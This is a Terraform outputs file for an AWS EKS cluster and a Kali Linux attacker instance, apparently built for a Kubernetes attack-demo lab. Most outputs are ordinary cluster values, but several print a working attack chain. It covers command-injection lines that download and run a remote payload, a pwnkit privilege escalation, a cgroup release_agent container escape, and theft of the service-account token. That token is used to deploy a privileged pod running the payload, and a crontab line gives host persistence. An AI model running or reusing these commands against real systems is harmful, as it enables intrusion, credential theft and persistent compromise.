################################################################################
# Cluster
################################################################################
output "cluster_name" {
  description = "The Amazon Resource Name (ARN) of the cluster"
  value       = module.eks.cluster_id
}

output "cluster_arn" {
  description = "The Amazon Resource Name (ARN) of the cluster"
  value       = module.eks.cluster_arn
}

output "cluster_certificate_authority_data" {
  description = "Base64 encoded certificate data required to communicate with the cluster"
  value       = module.eks.cluster_certificate_authority_data
}

output "cluster_endpoint" {
  description = "Endpoint for your Kubernetes API server"
  value       = module.eks.cluster_endpoint
}

output "cluster_id" {
  description = "The name/id of the EKS cluster. Will block on cluster creation until the cluster is really ready"
  value       = module.eks.cluster_id
}

# output "cluster_platform_version" {
#   description = "Platform version for the cluster"
#   value       = module.eks.cluster_platform_version
# }

output "cluster_status" {
  description = "Status of the EKS cluster. One of `CREATING`, `ACTIVE`, `DELETING`, `FAILED`"
  value       = module.eks.cluster_status
}


################################################################################
# Additional
################################################################################

output "region" {
  description = "AWS region"
  value       = var.region
}

################################################################################
# Additional
################################################################################

output "kali_linux_public_ip" {
  value = <<EOT

################################################################################
# KALI LINUX SSH:
################################################################################
  
ssh -o StrictHostKeyChecking=no -i ${var.ssh_key_path} kali@${module.ec2_instance.public_ip}


EOT
}

output "command_injection" {
  value = <<-COMMAND_INJECTION

################################################################################
# USE THIS FOR THE COMMAND INJECTION:
################################################################################

;curl -vk http://${module.ec2_instance.public_ip}:8001/met-container -o /tmp/met

;chmod 777 /tmp/met

;/tmp/met

  
  COMMAND_INJECTION
}

output "priv-escalation" {
  value = <<-PRIV_ESCALATION

################################################################################
# USE THIS FOR THE PRIV ESCALATION:
################################################################################

cd /tmp
curl -vkO https://pwnkit.s3.amazonaws.com/priv-es
chmod a+x ./priv-es
./priv-es
python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'

  
  PRIV_ESCALATION
}

output "escape_container_script" {
  value = <<-EOT

################################################################################
# USE THIS TO ESCAPE CONTAINER ONTO THE HOST
################################################################################

mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "curl -vk http://${module.ec2_instance.public_ip}:8001/met-host -o /run/met" >> /cmd
echo "chmod 777 /run/met" >> /cmd
echo "/run/met" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"


  EOT
}

output "service_account_hack" {
  value = <<-EOT
ls -la /var/run/secrets/kubernetes.io/serviceaccount
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/token

APISERVER=https://kubernetes.default.svc
SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
NAMESPACE=$(cat $\{SERVICEACCOUNT}/namespace)
TOKEN=$(cat $\{SERVICEACCOUNT}/token)
CACERT=$\{SERVICEACCOUNT}/ca.crt

curl -vk --cacert $\{CACERT} --header "Authorization: Bearer $\{TOKEN}" -X GET $\{APISERVER}/version

curl -vk --cacert $\{CACERT} --header "Authorization: Bearer $\{TOKEN}" -X GET $\{APISERVER}/api

curl -vk --cacert $\{CACERT} --header "Authorization: Bearer $\{TOKEN}" -X GET $\{APISERVER}/apis/apps/v1

curl -vk --cacert $\{CACERT} --header "Authorization: Bearer $\{TOKEN}" -X GET $\{APISERVER}/apis/apps/v1/namespaces/default/deployments

curl --cacert $\{CACERT} --header "Authorization: Bearer $\{TOKEN}" -X POST $\{APISERVER}/apis/apps/v1/namespaces/default/deployments -H 'Content-Type: application/yaml' -d '---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: kali-hacker
  namespace: default
spec:
  selector:
    matchLabels:
      app: kali-hacker
  template:
    metadata:
      labels:
        app: kali-hacker
    spec:
      containers:
        - name: dvwa
          image: docker.io/kalilinux/kali-rolling
          command: ["/bin/bash","-c","/usr/bin/apt update -y && /usr/bin/apt install -y curl && /usr/bin/curl -vk http://${module.ec2_instance.public_ip}:8001/met-kali -o /tmp/met && /usr/bin/chmod 777 /tmp/met && /tmp/met"]
          imagePullPolicy: IfNotPresent
          ports:
            - containerPort: 80
          securityContext:
            privileged: true
      terminationGracePeriodSeconds: 30
'

id
mount /dev/nvme0n1p1 /mnt/
echo "*/1 * * * * root curl -vk http://${module.ec2_instance.public_ip}:8001/met-host -o /root/met && chmod 777 /root/met && /root/met" >> /mnt/etc/crontab
  EOT
}

output "cluster_security_group_id" {
  description = "Cluster security group that was created by Amazon EKS for the cluster. Managed node groups use this security group for control-plane-to-data-plane communication. Referred to as 'Cluster security group' in the EKS console"
  value       = module.eks.cluster_security_group_id
}

output "cluster_primary_security_group_id" {
  value = module.eks.cluster_primary_security_group_id
}